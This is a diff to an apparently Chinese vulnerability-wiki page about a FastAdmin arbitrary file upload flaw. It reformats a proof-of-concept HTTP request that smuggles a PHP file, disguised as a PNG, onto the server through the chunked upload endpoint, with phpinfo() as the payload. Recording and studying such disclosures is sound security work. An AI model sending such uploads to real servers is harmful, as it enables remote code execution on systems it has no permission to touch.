@@ -37,8 +37,10 @@ app="FASTADMIN-框架" || body="\"uploadurl\":\"ajax\/upload\"" || body="api.fas
 
 上传头像处 post：
 
-```
-//传入xx.php
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">//传入xx.php
 POST /index/ajax/upload HTTP/1.1
 Host: target
 
@@ -48,7 +50,7 @@ Content-Type: application/octet-stream
 
 PNG
 ...
-<?php phpinfo();?>
+&lt;?php phpinfo();?&gt;
 ------WebKitFormBoundarybw5c2a2bqlLLOMEU
 Content-Disposition: form-data; name="chunkid"
 
@@ -58,8 +60,9 @@ xx.php
 Content-Disposition: form-data; name="chunkindex"
 
 0
-------WebKitFormBoundarybw5c2a2bqlLLOMEU
-```
+------WebKitFormBoundarybw5c2a2bqlLLOMEU</code></pre>
+
+</details>
 
 ![image-20221206160222513](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/framework/images/image-20221206160222513.png)
 
